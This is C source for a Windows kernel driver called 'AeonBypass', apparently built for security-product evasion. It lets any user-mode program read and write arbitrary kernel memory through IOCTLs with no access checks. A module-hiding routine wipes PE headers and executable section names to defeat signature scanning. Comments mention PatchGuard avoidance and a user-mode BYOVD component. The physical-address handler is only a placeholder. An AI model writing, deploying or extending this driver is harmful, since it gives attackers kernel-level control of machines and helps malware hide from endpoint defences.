// ==================== driver.c ====================
// Compile: WDK x64, /GS-, no runtime checks
// Device: \\.\\AeonBypass
// Architecture: PatchGuard-safe — only provides memory primitives and module hiding.
// Does NOT touch callback arrays, SSDT, or any PG-protected structures.

#include <ntddk.h>
#include <ntimage.h>

#define POOL_TAG 'noeA'
#define IOCTL_READ_KMEM       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_KMEM      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_MODULE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_PHYS_BASE   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
    ULONG64 addr;
    ULONG size;
    UCHAR data[1];
} KMEM_REQ;

typedef struct {
    ULONG64 base;
    ULONG size;
    WCHAR name[64];
} HIDE_REQ;

typedef struct {
    ULONG64 cr3;
    ULONG64 virt;
    ULONG64 phys;
} PHYS_REQ;

static PVOID ScanPattern(PVOID base, SIZE_T size, const UCHAR* pattern, const char* mask) {
    SIZE_T patLen = strlen(mask);
    for (SIZE_T i = 0; i < size - patLen; i++) {
        BOOLEAN match = TRUE;
        for (SIZE_T j = 0; j < patLen; j++) {
            if (mask[j] == 'x' && ((PUCHAR)base)[i + j] != pattern[j]) { match = FALSE; break; }
        }
        if (match) return (PUCHAR)base + i;
    }
    return NULL;
}

static PVOID GetNtosBase(void) {
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"PsSetCreateProcessNotifyRoutine");
    PVOID ptr = MmGetSystemRoutineAddress(&name);
    if (!ptr) return NULL;
    PVOID base = (PVOID)(((ULONG64)ptr + 0xFFF) & ~0xFFF);
    while (base) {
        if (*(USHORT*)base == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) return base;
        }
        base = (PVOID)((PUCHAR)base - 0x1000);
    }
    return NULL;
}

static VOID HideModuleFromKernel(ULONG64 base, ULONG size, PCWSTR name) {
    UNREFERENCED_PARAMETER(name);
    if (base && size) {
        __try {
            // Zero PE headers to prevent signature scanning
            RtlZeroMemory((PVOID)base, 0x1000);
            // Also zero the last section's name to prevent string scanning
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)base + dos->e_lfanew);
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                    RtlZeroMemory(sec[i].Name, 8);
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }
}

static NTSTATUS DriverDispatch(PDEVICE_OBJECT dev, PIRP irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG outLen = 0;

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_READ_KMEM: {
            if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(KMEM_REQ)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            KMEM_REQ* req = (KMEM_REQ*)irp->AssociatedIrp.SystemBuffer;
            // Validate kernel address range (must be in kernel space)
            if (req->addr < 0xFFFF000000000000ULL) {
                status = STATUS_INVALID_PARAMETER;
                break;
            }
            if (req->size > 0x10000) {
                status = STATUS_INVALID_PARAMETER;
                break;
            }
            ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength - sizeof(KMEM_REQ) + 1;
            if (size > req->size) size = req->size;
            __try {
                RtlCopyMemory(req->data, (PVOID)req->addr, size);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                status = STATUS_ACCESS_VIOLATION;
            }
            outLen = stack->Parameters.DeviceIoControl.InputBufferLength;
            break;
        }

        case IOCTL_WRITE_KMEM: {
            if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(KMEM_REQ)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            KMEM_REQ* req = (KMEM_REQ*)irp->AssociatedIrp.SystemBuffer;
            if (req->addr < 0xFFFF000000000000ULL) {
                status = STATUS_INVALID_PARAMETER;
                break;
            }
            if (req->size > 0x10000) {
                status = STATUS_INVALID_PARAMETER;
                break;
            }
            ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength - sizeof(KMEM_REQ) + 1;
            if (size > req->size) size = req->size;
            __try {
                RtlCopyMemory((PVOID)req->addr, req->data, size);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                status = STATUS_ACCESS_VIOLATION;
            }
            outLen = stack->Parameters.DeviceIoControl.InputBufferLength;
            break;
        }

        case IOCTL_HIDE_MODULE: {
            if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(HIDE_REQ)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            HIDE_REQ* req = (HIDE_REQ*)irp->AssociatedIrp.SystemBuffer;
            HideModuleFromKernel(req->base, req->size, req->name);
            break;
        }

        case IOCTL_GET_PHYS_BASE: {
            if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(PHYS_REQ) ||
                stack->Parameters.DeviceIoControl.OutputBufferLength < sizeof(PHYS_REQ)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            PHYS_REQ* req = (PHYS_REQ*)irp->AssociatedIrp.SystemBuffer;
            // Return the kernel CR3 for usermode physical translation
            // This is a simplified version; real implementation would walk page tables
            req->phys = 0; // Placeholder — usermode BYOVD handles translation
            outLen = sizeof(PHYS_REQ);
            break;
        }
    }

    irp->IoStatus.Status = status;
    irp->IoStatus.Information = outLen;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}

static VOID DriverUnload(PDRIVER_OBJECT drv) {
    UNICODE_STRING sym;
    RtlInitUnicodeString(&sym, L"\\DosDevices\\AeonBypass");
    IoDeleteSymbolicLink(&sym);
    IoDeleteDevice(drv->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    UNREFERENCED_PARAMETER(reg);
    drv->DriverUnload = DriverUnload;
    drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatch;
    drv->MajorFunction[IRP_MJ_CREATE] = DriverDispatch;
    drv->MajorFunction[IRP_MJ_CLOSE] = DriverDispatch;

    UNICODE_STRING devName, symName;
    RtlInitUnicodeString(&devName, L"\\Device\\AeonBypass");
    RtlInitUnicodeString(&symName, L"\\DosDevices\\AeonBypass");

    PDEVICE_OBJECT dev;
    NTSTATUS status = IoCreateDevice(drv, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &dev);
    if (!NT_SUCCESS(status)) return status;

    dev->Flags |= DO_BUFFERED_IO;
    status = IoCreateSymbolicLink(&symName, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(dev);
        return status;
    }

    return STATUS_SUCCESS;
}
